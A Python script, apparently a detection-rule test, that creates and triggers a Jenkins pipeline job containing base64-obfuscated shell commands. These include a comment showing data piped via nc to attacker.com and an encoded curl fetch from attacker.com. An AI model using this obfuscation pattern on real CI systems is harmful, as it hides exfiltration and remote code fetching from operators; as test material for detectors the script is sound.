"""
Attack 05 — Obfuscated Command (RULE-005 / T1027)
Creates a Jenkins pipeline with base64-encoded malicious commands.
"""
from config import jenkins_api


# Pipeline with obfuscated commands
OBFUSCATED_PIPELINE = """
pipeline {
    agent any
    stages {
        stage('Setup') {
            steps {
                sh 'echo "Setting up environment..."'
            }
        }
        stage('Post-Install') {
            steps {
                // Obfuscated payload: echo "stealing secrets" | nc attacker.com 4444
                sh 'echo c3RlYWxpbmcgc2VjcmV0cw== | base64 -d | bash'
                sh 'python -c "exec(__import__(\\'base64\\').b64decode(\\'cHJpbnQoMSk=\\'))"'
                sh '$(echo Y3VybCBodHRwOi8vYXR0YWNrZXIuY29tL3BheWxvYWQ= | base64 --decode)'
            }
        }
    }
}
"""


def create_obfuscated_job():
    """Create a Jenkins job with base64-encoded malicious commands."""
    print("[ATTACK-05] Obfuscated Command (RULE-005 / T1027)")

    job_name = "dpff-attack-05-obfuscation"

    config_xml = f"""<?xml version='1.1' encoding='UTF-8'?>
<flow-definition plugin="workflow-job">
  <description>Attack 05: Obfuscated pipeline commands</description>
  <definition class="org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition" plugin="workflow-cps">
    <script>{OBFUSCATED_PIPELINE}</script>
    <sandbox>true</sandbox>
  </definition>
</flow-definition>"""

    resp = jenkins_api("POST", f"/createItem?name={job_name}",
                       data=config_xml,
                       headers={"Content-Type": "application/xml"})

    if resp.status_code == 200:
        print(f"  ✓ Created obfuscated job '{job_name}'")
    elif resp.status_code == 400:
        print(f"  ✓ Job '{job_name}' already exists")
    else:
        print(f"  ✗ Failed: {resp.status_code}: {resp.text[:200]}")
        return False

    # Trigger build
    resp = jenkins_api("POST", f"/job/{job_name}/build")
    if resp.status_code in (200, 201):
        print(f"  ✓ Build triggered")
    else:
        print(f"  ⚠ Build trigger returned {resp.status_code}")

    return True


if __name__ == "__main__":
    create_obfuscated_job()
